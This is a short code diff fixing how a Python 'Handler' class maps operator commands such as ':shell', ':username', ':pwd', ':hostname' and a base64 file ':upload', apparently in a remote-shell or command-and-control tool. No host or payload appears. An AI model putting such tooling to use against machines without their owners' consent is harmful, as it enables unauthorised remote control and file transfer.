@@ -57,11 +57,11 @@ class Handler:
                 if self.cmd == ":shell":
                     self.selected_command = self.args
                 elif self.cmd == ":username":
-                    self.selected_command = self.args
+                    self.selected_command = self.cmd
                 elif self.cmd == ":pwd":
-                    self.selected_command = self.args
+                    self.selected_command = self.cmd
                 elif self.cmd == ":hostname":
-                    self.selected_command = self.args
+                    self.selected_command = self.cmd
                 elif self.cmd == ":upload":
                     data = Request.encode_base64(self.write_from_file(self.args.split()[0]))
                     self.selected_command = self.cmd + " " + self.args.split()[1] + " " + data
